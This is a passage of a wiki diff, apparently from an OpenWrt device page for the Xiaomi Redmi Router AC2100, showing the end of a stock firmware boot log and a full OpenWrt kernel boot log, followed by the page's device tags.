+[   44.050000] *hwnat reg dev ******* set dev[lo]->ifindex = 1
+[   44.050000] *hwnat reg dev ******* set dev[ifb0]->ifindex = 2
+[   44.060000] *hwnat reg dev ******* set dev[wl1]->ifindex = 5
+[   44.060000] *hwnat reg dev ******* set dev[wl0]->ifindex = 6
+[   44.070000] *hwnat reg dev ******* set dev[br-lan]->ifindex = 7
+[   44.080000] *hwnat reg dev ******* set dev[wl2]->ifindex = 8
+[   44.080000] *hwnat reg dev ******* set dev[wl3]->ifindex = 9
+[   44.090000] *hwnat reg dev ******* set dev[apcli0]->ifindex = 10
+[   44.090000] *hwnat reg dev ******* set dev[apclii0]->ifindex = 11
+[   44.140000] Device Instance
+[   44.140000] 	WDEV 00:, Name:wl0, Wdev(list) Idx:0
+[   44.150000] 		 Idx:6
+[   44.150000] 	WDEV 01:, Name:apclii0, Wdev(list) Idx:1
+[   44.150000] 		 Idx:11
+[   44.160000] 
+[   44.160000] 
+[   44.160000] 
+[   44.160000] 
+[   44.160000] 
+[   44.160000] 
+[   44.170000] 
+[   44.170000] 
+[   44.170000] 
+[   44.170000] 
+[   44.170000] 
+[   44.170000] 
+[   44.170000] 
+[   44.180000] 
+[   44.180000] 
+[   44.180000] 
+[   44.190000] Device Instance
+[   44.190000] 	WDEV 00:, Name:wl0, Wdev(list) Idx:0
+[   44.190000] 		 Idx:6
+[   44.190000] 	WDEV 01:, Name:apclii0, Wdev(list) Idx:1
+[   44.200000] 		 Idx:11
+[   44.200000] 
+[   44.200000] 
+[   44.210000] 
+[   44.210000] 
+[   44.210000] 
+[   44.210000] 
+[   44.210000] 
+[   44.210000] 
+[   44.210000] 
+[   44.220000] 
+[   44.220000] 
+[   44.220000] 
+[   44.220000] 
+[   44.220000] 
+[   44.220000] 
+[   44.220000] 
+[   44.240000] HNAT: switch HNAT ON.....
+Mon Nov 25 09:54:10 CST 2019 boot_check[3767]: INFO: Wireless OK
+[   45.320000] ipaccount: refresh dev ifname to [eth0 wl0 wl1 wl3] 
+[   45.320000] ipaccount: landev_init_all() add dev [eth0] is_wireless: 0.
+[   45.330000] ipaccount: landev_init_all() add dev [wl0] is_wireless: 1.
+[   45.340000] ipaccount: landev_init_all() add dev [wl1] is_wireless: 1.
+[   45.340000] ipaccount: landev_init_all() add dev [wl3] is_wireless: 1.
+[   47.680000] dev_redirect: add(+) dev redirect mapping: src:eth1->dst:ifb0
+[   49.610000] dev_redirect OFF.
+[   49.650000] dev_redirect OFF.dev_redirect OFF.ipaccount: landev_init_all() add dev [eth0] is_wireless: 0.
+[   51.870000] ipaccount: landev_init_all() add dev [wl0] is_wireless: 1.
+[   51.880000] ipaccount: landev_init_all() add dev [wl1] is_wireless: 1.
+[   51.880000] ipaccount: landev_init_all() add dev [wl3] is_wireless: 1.
+rcS S boot: INFO: rcS S boot timing 43 seconds.
+Sun Jan 26 14:36:59 CST 2020 INFO: rcS S boot timing 43 seconds.
+rcS S boot: system type(RM2100/2): SQUASH/3
+Sun Jan 26 14:36:59 CST 2020 system type(RM2100/2): SQUASH/3
+rcS S boot: ROOTFS: /dev/mtdblock14 on / type squashfs (ro,relatime)
+Sun Jan 26 14:36:59 CST 2020 ROOTFS: /dev/mtdblock14 on / type squashfs (ro,relatime)
+[   52.370000] led=6, on=1, off=4000, blinks,=1, reset=1, time=1
+[   52.380000] led=8, on=1, off=4000, blinks,=1, reset=1, time=1
+[   52.390000] led=8, on=4000, off=1, blinks,=1, reset=1, time=1
+Unlocking cfg_bak ...
+Erasing cfg_bak ...
+Unlocking cfg_bak ...
+
+Writing from /tmp/cfg_bak.tgz to cfg_bak ...  [ ][e][w]    
+Sun Jan 26 14:37:00 CST 2020 boot_check[6080]: Booting up finished.
+[   59.920000] led=10, on=1, off=4000, blinks,=1, reset=1, time=1
+[   59.930000] led=12, on=1, off=4000, blinks,=1, reset=1, time=1
+[   59.940000] led=12, on=4000, off=1, blinks,=1, reset=1, time=1
+</nowiki>
+</WRAP>\\
+
+==== OpenWrt bootlog ====
+<WRAP bootlog>
+<nowiki>[    0.000000] Linux version 5.4.34 (akane@redmagic) (gcc version 8.4.0 (OpenWrt GCC 8.4.0 r13046+8-df27e949fb)) #0 SMP Thu Apr 23 02:52:48 2020
+[    0.000000] SoC Type: MediaTek MT7621 ver:1 eco:3
+[    0.000000] printk: bootconsole [early0] enabled
+[    0.000000] CPU0 revision is: 0001992f (MIPS 1004Kc)
+[    0.000000] MIPS: machine is Xiaomi Redmi Router AC2100
+[    0.000000] Initrd not found or empty - disabling initrd
+[    0.000000] VPE topology {2,2} total 4
+[    0.000000] Primary instruction cache 32kB, VIPT, 4-way, linesize 32 bytes.
+[    0.000000] Primary data cache 32kB, 4-way, PIPT, no aliases, linesize 32 bytes
+[    0.000000] MIPS secondary cache 256kB, 8-way, linesize 32 bytes.
+[    0.000000] Zone ranges:
+[    0.000000]   Normal   [mem 0x0000000000000000-0x0000000007ffffff]
+[    0.000000]   HighMem  empty
+[    0.000000] Movable zone start for each node
+[    0.000000] Early memory node ranges
+[    0.000000]   node   0: [mem 0x0000000000000000-0x0000000007ffffff]
+[    0.000000] Initmem setup node 0 [mem 0x0000000000000000-0x0000000007ffffff]
+[    0.000000] On node 0 totalpages: 32768
+[    0.000000]   Normal zone: 288 pages used for memmap
+[    0.000000]   Normal zone: 0 pages reserved
+[    0.000000]   Normal zone: 32768 pages, LIFO batch:7
+[    0.000000] percpu: Embedded 14 pages/cpu s26672 r8192 d22480 u57344
+[    0.000000] pcpu-alloc: s26672 r8192 d22480 u57344 alloc=14*4096
+[    0.000000] pcpu-alloc: [0] 0 [0] 1 [0] 2 [0] 3 
+[    0.000000] Built 1 zonelists, mobility grouping on.  Total pages: 32480
+[    0.000000] Kernel command line: console=ttyS0,115200n8 rootfstype=squashfs,jffs2
+[    0.000000] Dentry cache hash table entries: 16384 (order: 4, 65536 bytes, linear)
+[    0.000000] Inode-cache hash table entries: 8192 (order: 3, 32768 bytes, linear)
+[    0.000000] Writing ErrCtl register=00021388
+[    0.000000] Readback ErrCtl register=00021388
+[    0.000000] mem auto-init: stack:off, heap alloc:off, heap free:off
+[    0.000000] Memory: 121104K/131072K available (5548K kernel code, 196K rwdata, 1208K rodata, 1228K init, 229K bss, 9968K reserved, 0K cma-reserved, 0K highmem)
+[    0.000000] SLUB: HWalign=32, Order=0-3, MinObjects=0, CPUs=4, Nodes=1
+[    0.000000] rcu: Hierarchical RCU implementation.
+[    0.000000] rcu: RCU calculated value of scheduler-enlistment delay is 25 jiffies.
+[    0.000000] NR_IRQS: 256
+[    0.000000] random: get_random_bytes called from start_kernel+0x340/0x554 with crng_init=0
+[    0.000000] CPU Clock: 880MHz
+[    0.000000] clocksource: GIC: mask: 0xffffffffffffffff max_cycles: 0xcaf478abb4, max_idle_ns: 440795247997 ns
+[    0.000000] clocksource: MIPS: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 4343773742 ns
+[    0.000009] sched_clock: 32 bits at 440MHz, resolution 2ns, wraps every 4880645118ns
+[    0.007801] Calibrating delay loop... 583.68 BogoMIPS (lpj=1167360)
+[    0.042017] pid_max: default: 32768 minimum: 301
+[    0.046779] Mount-cache hash table entries: 1024 (order: 0, 4096 bytes, linear)
+[    0.054005] Mountpoint-cache hash table entries: 1024 (order: 0, 4096 bytes, linear)
+[    0.064420] rcu: Hierarchical SRCU implementation.
+[    0.069852] smp: Bringing up secondary CPUs ...
+[    2.260422] Primary instruction cache 32kB, VIPT, 4-way, linesize 32 bytes.
+[    2.260433] Primary data cache 32kB, 4-way, PIPT, no aliases, linesize 32 bytes
+[    2.260444] MIPS secondary cache 256kB, 8-way, linesize 32 bytes.
+[    2.260546] CPU1 revision is: 0001992f (MIPS 1004Kc)
+[    0.102623] Synchronize counters for CPU 1: done.
+[    2.321754] Primary instruction cache 32kB, VIPT, 4-way, linesize 32 bytes.
+[    2.321762] Primary data cache 32kB, 4-way, PIPT, no aliases, linesize 32 bytes
+[    2.321770] MIPS secondary cache 256kB, 8-way, linesize 32 bytes.
+[    2.321823] CPU2 revision is: 0001992f (MIPS 1004Kc)
+[    0.167345] Synchronize counters for CPU 2: done.
+[    2.383128] Primary instruction cache 32kB, VIPT, 4-way, linesize 32 bytes.
+[    2.383137] Primary data cache 32kB, 4-way, PIPT, no aliases, linesize 32 bytes
+[    2.383144] MIPS secondary cache 256kB, 8-way, linesize 32 bytes.
+[    2.383200] CPU3 revision is: 0001992f (MIPS 1004Kc)
+[    0.225210] Synchronize counters for CPU 3: done.
+[    0.255079] smp: Brought up 1 node, 4 CPUs
+[    0.263494] clocksource: jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 7645041785100000 ns
+[    0.273184] futex hash table entries: 1024 (order: 3, 32768 bytes, linear)
+[    0.280278] pinctrl core: initialized pinctrl subsystem
+[    0.286971] NET: Registered protocol family 16
+[    0.302188] FPU Affinity set after 4688 emulations
+[    0.321612] random: fast init done
+[    0.325052] clocksource: Switched to clocksource GIC
+[    0.331846] NET: Registered protocol family 2
+[    0.337197] tcp_listen_portaddr_hash hash table entries: 512 (order: 0, 6144 bytes, linear)
+[    0.345490] TCP established hash table entries: 1024 (order: 0, 4096 bytes, linear)
+[    0.353084] TCP bind hash table entries: 1024 (order: 1, 8192 bytes, linear)
+[    0.360069] TCP: Hash tables configured (established 1024 bind 1024)
+[    0.366506] UDP hash table entries: 256 (order: 1, 8192 bytes, linear)
+[    0.372980] UDP-Lite hash table entries: 256 (order: 1, 8192 bytes, linear)
+[    0.380137] NET: Registered protocol family 1
+[    0.384451] PCI: CLS 0 bytes, default 32
+[    0.477021] 4 CPUs re-calibrate udelay(lpj = 1167360)
+[    0.483678] workingset: timestamp_bits=14 max_order=15 bucket_order=1
+[    0.500907] squashfs: version 4.0 (2009/01/31) Phillip Lougher
+[    0.506676] jffs2: version 2.2 (NAND) (SUMMARY) (LZMA) (RTIME) (CMODE_PRIORITY) (c) 2001-2006 Red Hat, Inc.
+[    0.519097] mt7621_gpio 1e000600.gpio: registering 32 gpios
+[    0.524937] mt7621_gpio 1e000600.gpio: registering 32 gpios
+[    0.530761] mt7621_gpio 1e000600.gpio: registering 32 gpios
+[    0.537077] Serial: 8250/16550 driver, 3 ports, IRQ sharing disabled
+[    0.544606] printk: console [ttyS0] disabled
+[    0.548887] 1e000c00.uartlite: ttyS0 at MMIO 0x1e000c00 (irq = 19, base_baud = 3125000) is a 16550A
+[    0.557873] printk: console [ttyS0] enabled
+[    0.566125] printk: bootconsole [early0] disabled
+[    0.577741] mt7621-nand 1e003000.nand: Using programmed access timing: 31c07388
+[    0.585316] nand: device found, Manufacturer ID: 0xc8, Chip ID: 0xd1
+[    0.591654] nand: ESMT PSU1GA30DT
+[    0.594965] nand: 128 MiB, SLC, erase size: 128 KiB, page size: 2048, OOB size: 64
+[    0.602519] mt7621-nand 1e003000.nand: ECC strength adjusted to 4 bits
+[    0.609073] mt7621-nand 1e003000.nand: Using programmed access timing: 21005134
+[    0.616363] mt7621-nand 1e003000.nand: Using programmed access timing: 21005134
+[    0.623653] Scanning device for bad blocks
+[    2.604779] 10 fixed-partitions partitions found on MTD device mt7621-nand
+[    2.611641] Creating 10 MTD partitions on "mt7621-nand":
+[    2.616948] 0x000000000000-0x000000080000 : "Bootloader"
+[    2.623545] 0x000000080000-0x0000000c0000 : "Config"
+[    2.629793] 0x0000000c0000-0x000000100000 : "Bdata"
+[    2.635925] 0x000000100000-0x000000140000 : "factory"
+[    2.642314] 0x000000140000-0x000000180000 : "crash"
+[    2.648297] 0x000000180000-0x0000001c0000 : "crash_syslog"
+[    2.654865] 0x0000001c0000-0x000000200000 : "reserved0"
+[    2.661260] 0x000000200000-0x000000600000 : "kernel_stock"
+[    2.667827] 0x000000600000-0x000000a00000 : "kernel"
+[    2.674067] 0x000000a00000-0x000007f80000 : "ubi"
+[    2.681708] libphy: Fixed MDIO Bus: probed
+[    2.711522] libphy: mdio: probed
+[    2.715000] mt7530 mdio-bus:1f: MT7530 adapts as multi-chip module
+[    2.722807] mtk_soc_eth 1e100000.ethernet eth0: mediatek frame engine at 0xbe100000, irq 21
+[    2.733368] mt7621-pci 1e140000.pcie: Parsing DT failed
+[    2.740977] NET: Registered protocol family 10
+[    2.747007] Segment Routing with IPv6
+[    2.750791] NET: Registered protocol family 17
+[    2.755593] 8021q: 802.1Q VLAN Support v1.8
+[    2.761655] mt7530 mdio-bus:1f: MT7530 adapts as multi-chip module
+[    3.597415] libphy: dsa slave smi: probed
+[    3.613111] mt7530 mdio-bus:1f wan (uninitialized): PHY [dsa-0.0:00] driver [Generic PHY]
+[    3.657108] mt7530 mdio-bus:1f lan1 (uninitialized): PHY [dsa-0.0:02] driver [Generic PHY]
+[    3.677110] mt7530 mdio-bus:1f lan2 (uninitialized): PHY [dsa-0.0:03] driver [Generic PHY]
+[    3.697109] mt7530 mdio-bus:1f lan3 (uninitialized): PHY [dsa-0.0:04] driver [Generic PHY]
+[    3.753056] mt7530 mdio-bus:1f: configuring for fixed/rgmii link mode
+[    4.369055] mt7530 mdio-bus:1f: Link is Up - 1Gbps/Full - flow control off
+[    4.445095] DSA: tree 0 setup
+[    4.448356] rt2880-pinmux pinctrl: pcie is already enabled
+[    4.453850] mt7621-pci 1e140000.pcie: Error applying setting, reverse things back
+[    4.461455] mt7621-pci-phy 1e149000.pcie-phy: PHY for 0xbe149000 (dual port = 1)
+[    4.469048] mt7621-pci-phy 1e14a000.pcie-phy: PHY for 0xbe14a000 (dual port = 0)
+[    4.576460] mt7621-pci-phy 1e149000.pcie-phy: Xtal is 40MHz
+[    4.582038] mt7621-pci-phy 1e14a000.pcie-phy: Xtal is 40MHz
+[    4.687548] mt7621-pci 1e140000.pcie: pcie2 no card, disable it (RST & CLK)
+[    4.694505] mt7621-pci 1e140000.pcie: PCIE0 enabled
+[    4.699373] mt7621-pci 1e140000.pcie: PCIE1 enabled
+[    4.704246] mt7621-pci 1e140000.pcie: PCI coherence region base: 0x60000000, mask/settings: 0xf0000002
+[    4.713693] mt7621-pci 1e140000.pcie: PCI host bridge to bus 0000:00
+[    4.720044] pci_bus 0000:00: root bus resource [io  0x1e160000-0x1e16ffff]
+[    4.726907] pci_bus 0000:00: root bus resource [mem 0x60000000-0x6fffffff]
+[    4.733769] pci_bus 0000:00: root bus resource [bus 00-ff]
+[    4.739282] pci 0000:00:00.0: [0e8d:0801] type 01 class 0x060400
+[    4.745310] pci 0000:00:00.0: reg 0x10: [mem 0x00000000-0x7fffffff]
+[    4.751567] pci 0000:00:00.0: reg 0x14: [mem 0x00000000-0x0000ffff]
+[    4.757894] pci 0000:00:00.0: supports D1
+[    4.761900] pci 0000:00:00.0: PME# supported from D0 D1 D3hot
+[    4.767988] pci 0000:00:01.0: [0e8d:0801] type 01 class 0x060400
+[    4.774026] pci 0000:00:01.0: reg 0x10: [mem 0x00000000-0x7fffffff]
+[    4.780284] pci 0000:00:01.0: reg 0x14: [mem 0x00000000-0x0000ffff]
+[    4.786601] pci 0000:00:01.0: supports D1
+[    4.790606] pci 0000:00:01.0: PME# supported from D0 D1 D3hot
+[    4.797593] pci 0000:00:00.0: bridge configuration invalid ([bus 00-00]), reconfiguring
+[    4.805595] pci 0000:00:01.0: bridge configuration invalid ([bus 00-00]), reconfiguring
+[    4.813774] pci 0000:01:00.0: [14c3:7615] type 00 class 0x000280
+[    4.819823] pci 0000:01:00.0: reg 0x10: [mem 0x00000000-0x000fffff 64bit]
+[    4.826775] pci 0000:01:00.0: 2.000 Gb/s available PCIe bandwidth, limited by 2.5 GT/s x1 link at 0000:00:00.0 (capable of 4.000 Gb/s with 5 GT/s x1 link)
+[    4.841805] pci 0000:00:00.0: PCI bridge to [bus 01-ff]
+[    4.847034] pci 0000:00:00.0:   bridge window [io  0x0000-0x0fff]
+[    4.853119] pci 0000:00:00.0:   bridge window [mem 0x00000000-0x000fffff]
+[    4.859901] pci 0000:00:00.0:   bridge window [mem 0x00000000-0x000fffff pref]
+[    4.867114] pci_bus 0000:01: busn_res: [bus 01-ff] end is updated to 01
+[    4.873915] pci 0000:02:00.0: [14c3:7603] type 00 class 0x028000
+[    4.879958] pci 0000:02:00.0: reg 0x10: [mem 0x00000000-0x000fffff]
+[    4.886351] pci 0000:02:00.0: PME# supported from D0 D3hot D3cold
+[    4.893710] pci 0000:00:01.0: PCI bridge to [bus 02-ff]
+[    4.898941] pci 0000:00:01.0:   bridge window [io  0x0000-0x0fff]
+[    4.905043] pci 0000:00:01.0:   bridge window [mem 0x00000000-0x000fffff]
+[    4.911817] pci 0000:00:01.0:   bridge window [mem 0x00000000-0x000fffff pref]
+[    4.919030] pci_bus 0000:02: busn_res: [bus 02-ff] end is updated to 02
+[    4.925689] pci 0000:00:00.0: BAR 0: no space for [mem size 0x80000000]
+[    4.932286] pci 0000:00:00.0: BAR 0: failed to assign [mem size 0x80000000]
+[    4.939234] pci 0000:00:01.0: BAR 0: no space for [mem size 0x80000000]
+[    4.945834] pci 0000:00:01.0: BAR 0: failed to assign [mem size 0x80000000]
+[    4.952781] pci 0000:00:00.0: BAR 8: assigned [mem 0x60000000-0x600fffff]
+[    4.959559] pci 0000:00:00.0: BAR 9: assigned [mem 0x60100000-0x601fffff pref]
+[    4.966770] pci 0000:00:01.0: BAR 8: assigned [mem 0x60200000-0x602fffff]
+[    4.973548] pci 0000:00:01.0: BAR 9: assigned [mem 0x60300000-0x603fffff pref]
+[    4.980750] pci 0000:00:00.0: BAR 1: assigned [mem 0x60400000-0x6040ffff]
+[    4.987531] pci 0000:00:01.0: BAR 1: assigned [mem 0x60410000-0x6041ffff]
+[    4.994311] pci 0000:00:00.0: BAR 7: assigned [io  0x1e160000-0x1e160fff]
+[    5.001087] pci 0000:00:01.0: BAR 7: assigned [io  0x1e161000-0x1e161fff]
+[    5.007871] pci 0000:01:00.0: BAR 0: assigned [mem 0x60000000-0x600fffff 64bit]
+[    5.015175] pci 0000:00:00.0: PCI bridge to [bus 01]
+[    5.020132] pci 0000:00:00.0:   bridge window [io  0x1e160000-0x1e160fff]
+[    5.026906] pci 0000:00:00.0:   bridge window [mem 0x60000000-0x600fffff]
+[    5.033681] pci 0000:00:00.0:   bridge window [mem 0x60100000-0x601fffff pref]
+[    5.040891] pci 0000:02:00.0: BAR 0: assigned [mem 0x60200000-0x602fffff]
+[    5.047668] pci 0000:00:01.0: PCI bridge to [bus 02]
+[    5.052623] pci 0000:00:01.0:   bridge window [io  0x1e161000-0x1e161fff]
+[    5.059398] pci 0000:00:01.0:   bridge window [mem 0x60200000-0x602fffff]
+[    5.066173] pci 0000:00:01.0:   bridge window [mem 0x60300000-0x603fffff pref]
+[    5.074723] UBI: auto-attach mtd9
+[    5.078092] ubi0: attaching mtd9
+[    6.293865] ubi0: scanning is finished
+[    6.315112] ubi0: attached mtd9 (name "ubi", size 117 MiB)
+[    6.320617] ubi0: PEB size: 131072 bytes (128 KiB), LEB size: 126976 bytes
+[    6.327477] ubi0: min./max. I/O unit sizes: 2048/2048, sub-page size 2048
+[    6.334246] ubi0: VID header offset: 2048 (aligned 2048), data offset: 4096
+[    6.341188] ubi0: good PEBs: 940, bad PEBs: 0, corrupted PEBs: 0
+[    6.347177] ubi0: user volume: 2, internal volumes: 1, max. volumes count: 128
+[    6.354388] ubi0: max/mean erase counter: 2/1, WL threshold: 4096, image sequence number: 1587555910
+[    6.363492] ubi0: available PEBs: 0, total reserved PEBs: 940, PEBs reserved for bad PEB handling: 20
+[    6.372711] ubi0: background thread "ubi_bgt0d" started, PID 460
+[    6.375170] block ubiblock0_0: created from ubi0:0(rootfs)
+[    6.384215] ubiblock: device ubiblock0_0 (rootfs) set to be root filesystem
+[    6.391170] hctosys: unable to open rtc device (rtc0)
+[    6.403359] VFS: Mounted root (squashfs filesystem) readonly on device 254:0.
+[    6.414574] Freeing unused kernel memory: 1228K
+[    6.419146] This architecture does not have kernel memory protection.
+[    6.425572] Run /sbin/init as init process
+[    6.961749] init: Console is alive
+[    6.965415] init: - watchdog -
+[    7.539215] kmodloader: loading kernel modules from /etc/modules-boot.d/*
+[    7.631947] kmodloader: done loading kernel modules from /etc/modules-boot.d/*
+[    7.641395] init: - preinit -
+[    8.311349] mtk_soc_eth 1e100000.ethernet eth0: configuring for fixed/rgmii link mode
+[    8.319686] mtk_soc_eth 1e100000.ethernet eth0: Link is Up - 1Gbps/Full - flow control rx/tx
+[    8.328197] IPv6: ADDRCONF(NETDEV_CHANGE): eth0: link becomes ready
+[    8.459990] random: jshn: uninitialized urandom read (4 bytes read)
+[    8.520088] random: jshn: uninitialized urandom read (4 bytes read)
+[    8.555676] random: jshn: uninitialized urandom read (4 bytes read)
+[    8.761072] mt7530 mdio-bus:1f lan1: configuring for phy/gmii link mode
+[    8.793231] 8021q: adding VLAN 0 to HW filter on device lan1
+[   12.975658] UBIFS (ubi0:1): Mounting in unauthenticated mode
+[   12.981566] UBIFS (ubi0:1): background thread "ubifs_bgt0_1" started, PID 571
+[   13.063599] UBIFS (ubi0:1): recovery needed
+[   13.277947] UBIFS (ubi0:1): recovery completed
+[   13.282571] UBIFS (ubi0:1): UBIFS: mounted UBI device 0, volume 1, name "rootfs_data"
+[   13.290387] UBIFS (ubi0:1): LEB size: 126976 bytes (124 KiB), min./max. I/O unit sizes: 2048 bytes/2048 bytes
+[   13.300276] UBIFS (ubi0:1): FS size: 111738880 bytes (106 MiB, 880 LEBs), journal size 5586944 bytes (5 MiB, 44 LEBs)
+[   13.310853] UBIFS (ubi0:1): reserved for root: 4952683 bytes (4836 KiB)
+[   13.317458] UBIFS (ubi0:1): media format: w4/r0 (latest is w5/r0), UUID B48B97F0-A8B0-48D8-8856-29DE8BC1BF05, small LPT model
+[   13.330211] mount_root: switching to ubifs overlay
+[   13.348715] overlayfs: upper fs does not support xattr, falling back to index=off and metacopy=off.
+[   13.361717] urandom-seed: Seeding with /etc/urandom.seed
+[   13.529242] procd: - early -
+[   13.532216] procd: - watchdog -
+[   14.117189] procd: - watchdog -
+[   14.120659] procd: - ubus -
+[   14.203119] urandom_read: 5 callbacks suppressed
+[   14.203131] random: ubusd: uninitialized urandom read (4 bytes read)
+[   14.215307] random: ubusd: uninitialized urandom read (4 bytes read)
+[   14.222969] procd: - init -
+[   14.663793] kmodloader: loading kernel modules from /etc/modules.d/*
+[   14.684349] Loading modules backported from Linux version v5.4.27-0-g585e0cc08069
+[   14.691953] Backport generated by backports.git v5.4.27-1-0-gf6e8852f
+[   14.715505] xt_time: kernel timezone is -0000
+[   14.766649] mt7621-pci 1e140000.pcie: bus=2 slot=1 irq=24
+[   14.772118] pci 0000:00:01.0: enabling device (0004 -> 0007)
+[   14.777794] mt7603e 0000:02:00.0: enabling device (0000 -> 0002)
+[   14.783972] mt7603e 0000:02:00.0: ASIC revision: 76030010
+[   14.876193] urngd: v1.0.2 started.
+[   15.015734] random: crng init done
+[   15.410357] mt7603e 0000:02:00.0: Firmware Version: ap_pcie
+[   15.415984] mt7603e 0000:02:00.0: Build Time: 20160107100755
+[   15.449063] mt7603e 0000:02:00.0: firmware init done
+[   15.627408] ieee80211 phy0: Selected rate control algorithm 'minstrel_ht'
+[   15.637103] mt7621-pci 1e140000.pcie: bus=1 slot=0 irq=23
+[   15.642582] pci 0000:00:00.0: enabling device (0004 -> 0007)
+[   15.648276] mt7615e 0000:01:00.0: enabling device (0000 -> 0002)
+[   15.671872] ieee80211 phy1: Selected rate control algorithm 'minstrel_ht'
+[   15.693526] PPP generic driver version 2.4.2
+[   15.699619] NET: Registered protocol family 24
+[   15.719223] kmodloader: done loading kernel modules from /etc/modules.d/*
+[   15.756716] mt7615e 0000:01:00.0: HW/SW Version: 0x8a108a10, Build Time: 20180518100604a
+[   15.756716] 
+[   16.063989] mt7615e 0000:01:00.0: N9 Firmware Version: 2.0, Build Time: 20200131181812
+[   16.168225] mt7615e 0000:01:00.0: CR4 Firmware Version: _reserved_, Build Time: 20190121161307
+[   21.030595] mtk_soc_eth 1e100000.ethernet eth0: Link is Down
+[   21.046910] mtk_soc_eth 1e100000.ethernet eth0: configuring for fixed/rgmii link mode
+[   21.055326] mtk_soc_eth 1e100000.ethernet eth0: Link is Up - 1Gbps/Full - flow control rx/tx
+[   21.129185] mt7530 mdio-bus:1f lan1: configuring for phy/gmii link mode
+[   21.153436] 8021q: adding VLAN 0 to HW filter on device lan1
+[   21.159545] IPv6: ADDRCONF(NETDEV_CHANGE): eth0: link becomes ready
+[   21.166912] br-lan: port 1(lan1) entered blocking state
+[   21.172284] br-lan: port 1(lan1) entered disabled state
+[   21.209222] device lan1 entered promiscuous mode
+[   21.213956] device eth0 entered promiscuous mode
+[   21.345142] mt7530 mdio-bus:1f lan2: configuring for phy/gmii link mode
+[   21.377541] 8021q: adding VLAN 0 to HW filter on device lan2
+[   21.384157] br-lan: port 2(lan2) entered blocking state
+[   21.389546] br-lan: port 2(lan2) entered disabled state
+[   21.445109] device lan2 entered promiscuous mode
+[   21.589070] mt7530 mdio-bus:1f lan3: configuring for phy/gmii link mode
+[   21.621251] 8021q: adding VLAN 0 to HW filter on device lan3
+[   21.627408] br-lan: port 3(lan3) entered blocking state
+[   21.632675] br-lan: port 3(lan3) entered disabled state
+[   21.721083] device lan3 entered promiscuous mode
+[   21.857063] mt7530 mdio-bus:1f wan: configuring for phy/gmii link mode
+[   21.889249] 8021q: adding VLAN 0 to HW filter on device wan
+[   24.921082] mt7530 mdio-bus:1f lan3: Link is Up - 100Mbps/Full - flow control rx/tx
+[   24.928796] br-lan: port 3(lan3) entered blocking state
+[   24.934042] br-lan: port 3(lan3) entered forwarding state
+[   24.985108] IPv6: ADDRCONF(NETDEV_CHANGE): br-lan: link becomes ready</nowiki>
+</WRAP>\\
+
+/* ===== Notes ===== */
+
+===== Tags =====
+[[meta:tags|How to add tags]]
+{{tag>ramips MT7621 128NAND 128RAM 4port GigabitEthernet 802.11ac 802.11bgn NonDetachableAntenna MIPS32 0USB}}
